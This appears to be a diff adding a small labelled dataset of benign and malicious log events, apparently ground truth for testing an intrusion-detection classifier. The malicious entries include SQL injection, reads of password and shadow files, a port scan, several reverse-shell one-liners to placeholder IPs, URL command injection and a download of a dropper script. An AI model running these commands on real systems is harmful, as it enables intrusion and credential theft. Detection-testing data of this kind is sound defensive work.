@@ -1,0 +1,22 @@
+[
+  { "id": 1, "evento": "GET /index.html HTTP/1.1", "src_ip": "192.168.1.10", "verdad": "benigna" },
+  { "id": 2, "evento": "GET /login?user=admin' OR '1'='1 HTTP/1.1", "src_ip": "203.0.113.4", "verdad": "maliciosa" },
+  { "id": 3, "evento": "POST /api/upload filename=reporte.pdf size=2MB", "src_ip": "192.168.1.55", "verdad": "benigna" },
+  { "id": 4, "evento": "cat /etc/passwd", "src_ip": "198.51.100.22", "verdad": "maliciosa" },
+  { "id": 5, "evento": "tail -f /var/log/syslog", "src_ip": "192.168.1.2", "verdad": "benigna" },
+  { "id": 6, "evento": "more /etc/shadow", "src_ip": "198.51.100.22", "verdad": "maliciosa" },
+  { "id": 7, "evento": "GET /static/css/estilos.css HTTP/1.1", "src_ip": "192.168.1.10", "verdad": "benigna" },
+  { "id": 8, "evento": "nmap -sS -p 1-1024 192.168.1.1", "src_ip": "203.0.113.88", "verdad": "maliciosa" },
+  { "id": 9, "evento": "ping -c 4 8.8.8.8", "src_ip": "192.168.1.15", "verdad": "benigna" },
+  { "id": 10, "evento": "echo 'nc -e /bin/sh 10.0.0.1 4444' > /tmp/rev.sh", "src_ip": "203.0.113.99", "verdad": "maliciosa" },
+  { "id": 11, "evento": "curl -s http://192.168.1.1/api/health", "src_ip": "192.168.1.2", "verdad": "benigna" },
+  { "id": 12, "evento": "bash -c 'bash -i >& /dev/tcp/198.51.100.5/443 0>&1'", "src_ip": "198.51.100.5", "verdad": "maliciosa" },
+  { "id": 13, "evento": "ssh admin@192.168.1.1 -p 22", "src_ip": "192.168.1.2", "verdad": "benigna" },
+  { "id": 14, "evento": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.5\",9001));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'", "src_ip": "203.0.113.120", "verdad": "maliciosa" },
+  { "id": 15, "evento": "apt-get update && apt-get upgrade -y", "src_ip": "192.168.1.2", "verdad": "benigna" },
+  { "id": 16, "evento": "head -n 50 /etc/security/passwd", "src_ip": "203.0.113.44", "verdad": "maliciosa" },
+  { "id": 17, "evento": "git clone https://github.com/proyecto/web.git", "src_ip": "192.168.1.70", "verdad": "benigna" },
+  { "id": 18, "evento": "curl http://192.168.1.10/admin?cmd=id;whoami", "src_ip": "198.51.100.90", "verdad": "maliciosa" },
+  { "id": 19, "evento": "systemctl status nginx", "src_ip": "192.168.1.2", "verdad": "benigna" },
+  { "id": 20, "evento": "wget http://malicious.cc/drop.sh -O /tmp/d.sh && chmod +x /tmp/d.sh", "src_ip": "203.0.113.77", "verdad": "maliciosa" }
+]
